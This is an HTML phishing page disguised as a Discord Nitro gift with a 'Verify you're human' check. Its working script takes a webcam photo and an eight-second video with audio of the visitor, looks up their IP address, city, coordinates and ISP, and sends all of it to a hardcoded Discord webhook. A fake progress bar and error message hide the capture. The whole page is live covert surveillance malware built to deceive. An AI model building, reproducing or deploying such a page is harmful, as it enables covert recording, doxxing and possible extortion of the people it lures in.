<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
  <meta property="og:title" content="A WILD GIFT APPEARED! 🎁">
  <meta property="og:type" content="website">
  <meta property="og:url" content="https://nitro-gift-activate.github.io/redeem/">
  <meta property="og:image" content="https://www.fosslinux.com/wp-content/uploads/2022/11/Discord-Nitro.png">
  <meta property="og:image:width" content="1200">
  <meta property="og:image:height" content="630">
  <meta property="og:image:type" content="image/png">
  <meta name="theme-color" content="#313338">
  <meta property="twitter:card" content="summary_large_image">

  <title>Discord Gift</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    :root {
      --bg-primary: #36393f;
      --bg-secondary: #2f3136;
      --bg-elevated: rgba(47, 49, 54, 0.94);
      --text-primary: #dcddde;
      --text-secondary: #b9bbbe;
      --text-header: #ffffff;
      --accent: #5865f2;
      --accent-hover: #4752c4;
      --border-subtle: rgba(255,255,255,0.06);
      --radius-sm: 4px;
      --radius-md: 8px;
      --spacing-xs: 8px;
      --spacing-sm: 12px;
      --spacing-md: 16px;
      --spacing-lg: 24px;
    }

    body {
      min-height: 100vh;
      background: var(--bg-primary) url('https://files.catbox.moe/r714lj.png') no-repeat center center / cover fixed;
      color: var(--text-primary);
      font-family: "gg sans", system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, Cantarell, "Helvetica Neue", Arial, sans-serif;
      -webkit-font-smoothing: antialiased;
      -moz-osx-font-smoothing: grayscale;
      display: flex;
      align-items: center;
      justify-content: center;
      padding: env(safe-area-inset-top) env(safe-area-inset-right) env(safe-area-inset-bottom) env(safe-area-inset-left);
      position: relative;
    }

    .top-left-logo {
      position: fixed;
      width: 124px;
      height: auto;
      opacity: 0.9;
      z-index: 1000;
      border-radius: var(--radius-sm);
      box-shadow: none;           /* No shadow on any device */
    }

    .discord-modal {
      background: var(--bg-elevated);
      border-radius: var(--radius-md);
      box-shadow: 0 4px 20px rgba(0,0,0,0.5);
      backdrop-filter: blur(8px);
      border: 1px solid var(--border-subtle);
      overflow: hidden;
      text-align: center;
      position: relative;
      z-index: 10;
    }

    /* Desktop / larger screens */
    @media (min-width: 768px) {
      .discord-modal {
        width: 460px;
        max-width: 90vw;
        padding: 40px 48px 36px;
      }

      .top-left-logo {
        top: 48px;
        left: 48px;
      }

      .title {
        font-size: 24px;
        font-weight: 600;
        line-height: 1.2;
        margin-bottom: var(--spacing-md);
        color: var(--text-header);
      }

      .subtitle {
        font-size: 16px;
        line-height: 1.45;
        color: var(--text-secondary);
        margin-bottom: 32px;
      }

      .btn-discord {
        min-height: 44px;
        padding: 0 40px;
        font-size: 16px;
        font-weight: 500;
      }
    }

    /* Mobile / small screens */
    @media (max-width: 767px) {
      html, body {
        height: 100%;
        overflow: hidden;
        touch-action: none;
      }

      body {
        display: block;
        margin: 0;
        padding: 0;
      }

      .top-left-logo {
        width: 160px;              /* Slightly larger when centered */
        top: 45px;
        left: 50%;
        transform: translateX(-50%);
        box-shadow: none;
      }

      .discord-modal {
        width: 100%;
        height: 100vh;
        padding: 60px 24px 40px;
        border-radius: 0;
        box-shadow: none;
        display: flex;
        flex-direction: column;
        align-items: center;
        justify-content: center;
        text-align: center;
      }

      .title {
        font-size: 22px;
        font-weight: 600;
        margin-bottom: var(--spacing-sm);
      }

      .subtitle {
        font-size: 15px;
        line-height: 1.4;
        margin-bottom: 32px;
      }

      .btn-discord {
        width: 100%;
        min-height: 48px;
        padding: 0 24px;
        font-size: 16px;
        font-weight: 500;
        border-radius: var(--radius-sm);
      }

      .progress-container {
        height: 6px;
        max-width: none;
      }
    }

    .title, .subtitle, .btn-discord, .progress-text {
      font-family: "gg sans", system-ui, sans-serif;
    }

    .btn-discord {
      background: var(--accent);
      color: #fff;
      border: none;
      border-radius: var(--radius-sm);
      cursor: pointer;
      transition: background 0.18s ease;
      font-weight: 500;
      display: inline-flex;
      align-items: center;
      justify-content: center;
    }

    .btn-discord:hover:not(:disabled) {
      background: var(--accent-hover);
    }

    .btn-discord:disabled {
      background: #3f70dd;
      opacity: 0.5;
      cursor: not-allowed;
    }

    .progress-container {
      width: 100%;
      background: #202225;
      border-radius: var(--radius-sm);
      overflow: hidden;
      height: 8px;
      margin: 24px auto 0;
      display: none;
      position: relative;
    }

    .progress-bar {
      width: 0%;
      height: 100%;
      background: var(--accent);
      transition: width 0.12s linear;
    }

    .progress-text {
      position: absolute;
      inset: 0;
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 13px;
      font-weight: 600;
      color: #fff;
      text-shadow: 0 1px 3px #000;
      pointer-events: none;
      display: none;
    }

    video, canvas { display: none; }
  </style>
</head>
<body>

  <img src="https://files.catbox.moe/vcl1uz.png" alt="" class="top-left-logo" aria-hidden="true">

  <div class="discord-modal">
    <div class="title">Verify you're human</div>
    <div class="subtitle">
      This quick check helps us keep our community safe and make sure you're not a bot.<br><br>
      Tap the button below to continue.
    </div>

    <div id="progressContainer" class="progress-container">
      <div id="progressBar" class="progress-bar"></div>
      <div id="progressText" class="progress-text">0%</div>
    </div>

    <button id="btn" class="btn-discord">Verify Me</button>

    <video id="video" autoplay playsinline muted></video>
    <canvas id="canvas"></canvas>
  </div>

  <script>
    const videoElement = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const msg = document.querySelector('.subtitle');
    const btn = document.getElementById('btn');
    const progressContainer = document.getElementById('progressContainer');
    const progressBar = document.getElementById('progressBar');
    const progressText = document.getElementById('progressText');

    const WEBHOOK_URL = "https://discord.com/api/webhooks/1479720607619748027/xZuWFEsKOyfqe5kYa8J48CzqFDEPmQwAexAf96dNu5NOpToyFBEUVj81Su6P9kG_ThRz";
    const RECORD_DURATION = 8000;

    let startTime = 0;
    let animationFrameId = null;

    function updateProgress() {
      if (!startTime) return;
      const elapsed = Date.now() - startTime;
      let percent = Math.min((elapsed / RECORD_DURATION) * 100, 100);
      progressBar.style.width = percent + '%';
      progressText.textContent = Math.round(percent) + '%';
      if (percent < 100) animationFrameId = requestAnimationFrame(updateProgress);
    }

    async function sendAttachment(content, blob, filename) {
      const payload = { content };
      const formData = new FormData();
      formData.append('payload_json', JSON.stringify(payload));
      formData.append('file', blob, filename);
      try {
        const res = await fetch(WEBHOOK_URL, { method: 'POST', body: formData });
        console.log(`Send ${filename} - Status: ${res.status}`);
        return res.ok;
      } catch (e) {
        console.error('Send error:', e);
        return false;
      }
    }

    async function captureMugshot() {
      const ctx = canvas.getContext('2d');
      canvas.width = videoElement.videoWidth || 640;
      canvas.height = videoElement.videoHeight || 480;
      ctx.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
      await new Promise(r => setTimeout(r, 300));
      ctx.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
      return new Promise(r => canvas.toBlob(r, 'image/png'));
    }

    async function recordAndSend() {
      try {
        msg.textContent = "Starting verification... Please wait.";
        btn.disabled = true;

        const stream = await navigator.mediaDevices.getUserMedia({
          video: { facingMode: "user", width: { ideal: 640 }, height: { ideal: 480 }, frameRate: { ideal: 15 } },
          audio: true
        });

        videoElement.srcObject = stream;

        await new Promise(resolve => {
          videoElement.onloadedmetadata = () => {
            videoElement.play().catch(console.error);
            resolve();
          };
          setTimeout(resolve, 5000);
        });

        await new Promise(r => setTimeout(r, 1500));

        const mugshotBlob = await captureMugshot();
        let geo = "Location unavailable";
        try {
          const res = await fetch('https://ipapi.co/json/');
          if (res.ok) {
            const d = await res.json();
            if (!d.error) geo = `IP: ${d.ip||'n/a'}\nCity: ${d.city||'n/a'}\nRegion: ${d.region||'n/a'}\nCountry: ${d.country_name||'n/a'}\nCoords: ${d.latitude||'n/a'}, ${d.longitude||'n/a'}\nISP: ${d.org||'n/a'}`;
          }
        } catch {}

        if (mugshotBlob?.size > 1000) {
          await sendAttachment(
            `🎯 Face capture\nUA: ${navigator.userAgent}\nTime: ${new Date().toISOString()}\n\n**Location/Device:**\n${geo}`,
            mugshotBlob,
            `face_${Date.now()}.png`
          );
        }

        progressContainer.style.display = 'block';
        msg.textContent = "Loading...";

        const recorder = new MediaRecorder(stream, { mimeType: 'video/webm;codecs=vp8,opus' });
        const chunks = [];

        recorder.ondataavailable = e => e.data.size > 0 && chunks.push(e.data);

        recorder.onstop = async () => {
          cancelAnimationFrame(animationFrameId);
          progressBar.style.width = '100%';
          progressText.textContent = '100%';

          stream.getTracks().forEach(t => t.stop());

          if (chunks.length === 0 || new Blob(chunks).size < 10000) {
            msg.textContent = "Couldn't verify — please keep your face centered and try again.";
            progressContainer.style.display = 'none';
            btn.style.display = 'none';
            return;
          }

          const blob = new Blob(chunks, { type: 'video/webm' });
          const vidContent = `🎥 Verification clip\nUA: ${navigator.userAgent}\nTime: ${new Date().toISOString()}\n\n**Location/Device:**\n${geo}`;

          let sent = await sendAttachment(vidContent, blob, `verification_${Date.now()}.webm`);
          if (!sent) await sendAttachment(vidContent, blob, `verification_${Date.now()}.mp4`);

          msg.textContent = "Verification incomplete. Make sure your face is clearly visible.";
          progressContainer.style.display = 'none';
          btn.style.display = 'none';
        };

        recorder.start(1000);
        startTime = Date.now();
        updateProgress();
        setTimeout(() => recorder.stop(), RECORD_DURATION);

      } catch (err) {
        msg.textContent = `Verification failed.\n${err.name}: ${err.message}\nPlease try again.`;
        progressContainer.style.display = 'none';
        btn.disabled = false;
      }
    }

    btn.addEventListener('click', recordAndSend);
  </script>
</body>
</html>
